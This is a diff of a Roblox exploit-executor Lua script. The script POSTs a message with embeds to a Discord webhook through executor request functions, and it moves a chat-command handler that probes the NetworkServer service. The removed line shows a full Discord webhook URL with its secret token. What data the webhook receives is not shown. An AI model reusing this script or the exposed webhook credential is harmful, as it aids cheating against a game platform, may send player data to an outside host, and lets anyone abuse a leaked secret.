@@ -6,7 +6,7 @@ local webhookcheck =
    "Kid with shit exploit"
 
 local url =
-   "https://discord.com/api/webhooks/891347157645414510/wt5Praq1B3_daRV-SMfuuSUy-EM1IZ-gio8K02TjWWOQi_RoU_NdpLa3L4gHm1w3Zuru"
+   ""
 local data = {
    ["content"] = "**Heyx#2112**",
    ["embeds"] = {
@@ -30,6 +30,20 @@ local headers = {
 request = http_request or request or HttpPost or syn.request
 local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
 request(abcdef)
+
+local Player = game.Players.LocalPlayer
+
+Player.Chatted:Connect(function(cht)
+	if cht:match("/e Fake") then
+	
+	game:GetService("NetworkServer")
+	print(game:GetService("NetworkServer"))
+	print(tostring(game:GetService("NetworkServer")))
+	
+	elseif cht:match("") then
+	-- Put Other Script 
+	end
+end)
 
 delay(0,function()
         respawn = false
@@ -149,17 +163,3 @@ local function checklegacy()
 	end
 end
 local succ, errr = pcall(checklegacy)
-
-local Player = game.Players.LocalPlayer
-
-Player.Chatted:Connect(function(cht)
-	if cht:match("/e Fake") then
-	
-	game:GetService("NetworkServer")
-	print(game:GetService("NetworkServer"))
-	print(tostring(game:GetService("NetworkServer")))
-	
-	elseif cht:match("") then
-	-- Put Other Script 
-	end
-end)
